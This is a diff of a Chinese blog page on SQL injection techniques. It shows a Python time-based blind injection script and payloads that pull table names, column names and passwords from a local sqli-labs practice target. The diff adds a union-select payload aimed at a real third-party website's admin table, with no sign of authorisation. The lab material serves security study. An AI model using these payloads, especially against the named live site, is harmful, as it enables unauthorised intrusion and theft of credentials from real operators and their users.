@@ -116,7 +116,7 @@
 <meta property="og:url" content="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html">
 <meta property="og:site_name" content="Hello_C技术博客">
 <meta property="og:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
-<meta property="og:updated_time" content="2017-07-16T11:14:05.480Z">
+<meta property="og:updated_time" content="2017-08-24T02:31:51.384Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入技巧">
 <meta name="twitter:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
@@ -402,7 +402,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2,094
+                  2,125
                 </span>
               
 
@@ -578,6 +578,8 @@
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding: utf-8 -*-</div><div class="line">import requests</div><div class="line">import time</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">                startTime=time.time()</div><div class="line">                payload = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">                url = payload.format(pos,mid)</div><div class="line">                response=requests.get(url)    #发送请求</div><div class="line">                if time.time() - startTime &lt; 5:    #判断是否延时了5秒</div><div class="line">                    low = mid + 1</div><div class="line">                else:</div><div class="line">                    high = mid</div><div class="line">                mid = (high + low) &gt;&gt; 1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
 <p>剩余步骤和基于布尔的差不多，只是加了一个if判断语句进行判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">获取表名：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23</div><div class="line">获取列名：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">获取内容：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div></pre></td></tr></table></figure></p>
+<p>1,column_name from information_schema.columns where table_schema = database() and table_name = 0x6d63795f61646d696e</p>
+<p><a href="http://www.innogreen.com.hk/VerticalGreening.php?id=-22" target="_blank" rel="external">http://www.innogreen.com.hk/VerticalGreening.php?id=-22</a> union select 1,group_concat(column_name) from information_schema.columns where  table_name = 0x6d63795f61646d696e #</p>
 
       
     </div>
@@ -749,7 +751,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">62</span>
+                <span class="site-state-item-count">63</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -760,7 +762,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -771,7 +773,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
